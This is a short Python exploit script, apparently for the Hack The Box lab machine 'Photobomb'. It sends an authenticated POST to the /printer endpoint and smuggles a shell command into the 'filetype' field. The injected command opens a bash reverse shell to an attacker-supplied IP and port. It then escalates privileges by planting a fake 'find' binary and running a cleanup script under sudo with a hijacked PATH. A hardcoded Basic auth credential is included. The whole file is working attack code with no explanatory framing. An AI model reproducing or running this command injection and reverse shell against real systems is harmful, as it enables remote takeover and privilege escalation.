import sys
import requests

def rce(ip,port):
	reverse_shell = "bash -i >& /dev/tcp/"+ ip + "/"+ port + " 0>&1"
	command = "/home/wizard/find | chmod +x /home/wizard/find | sudo PATH=/home/wizard:$PATH /opt/cleanup.sh"
	payload = "echo -n \'"+ reverse_shell + "\' > " + command
	return payload

pwn = rce(sys.argv[1],sys.argv[2])

url = "http://photobomb.htb/printer"
header = {"Authorization": "Basic cEgwdDA6YjBNYiE="}
data = {"photo":"finn-whelen-DTfhsDIWNSg-unsplash.jpg","filetype":"jpg;"+pwn,"dimensions":"3000x2000"}
r = requests.post(url=url,headers=header,data=data)
print(r.text)